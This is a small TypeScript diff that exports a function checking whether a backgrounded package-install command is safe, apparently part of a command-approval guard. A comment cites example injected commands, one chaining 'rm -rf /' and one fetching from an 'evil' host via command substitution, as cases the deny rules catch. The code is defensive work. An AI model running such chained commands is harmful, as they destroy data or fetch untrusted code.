@@ -336,7 +336,7 @@ export function matchesAllowedPrefix(command: string, _depth = 0): boolean {
  * before we approve, so commands like `pnpm add foo; rm -rf /` or
  * `pnpm add foo $(curl evil) &` still get caught by the deny rules below.
  */
-function isSafeBackgroundedInstall(command: string): boolean {
+export function isSafeBackgroundedInstall(command: string): boolean {
   // Strip stderr redirection (2>&1, 2>&2, 1>&2, …) so we can pattern-match
   // the underlying base command + & terminator.
   const stripped = command.replace(/\s*\d*>&\d+\s*/g, ' ').trim();
